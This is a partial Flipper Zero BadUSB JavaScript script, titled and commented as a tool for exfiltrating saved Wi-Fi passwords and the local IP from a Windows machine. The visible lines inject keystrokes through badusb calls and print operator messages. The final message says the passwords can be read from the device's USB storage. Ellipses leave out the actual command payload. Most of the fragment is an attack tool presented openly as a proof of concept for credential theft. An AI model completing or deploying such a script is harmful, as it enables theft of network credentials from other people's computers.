// Windows Wi-Fi Password Exfiltration script
// By Derek Jamison (Modified by Danucosukosuko)
...
// Update this script to include the commands you want to run. (In this case, the commands are to exfiltrate the local IP and Wi-Fi passwords registered in the device.)
let script = [
...
print("Flipper Zero PoC: Exfiltrate data");
delay(5000);
...
badusb.press("ENTER");
badusb.print(" Start-Sleep 3; exit");
badusb.press("ENTER");
badusb.quit();
...
notify.success();
print("Done. You can retire the Flipper Zero and view the passwords with USB Mass Storage app.");
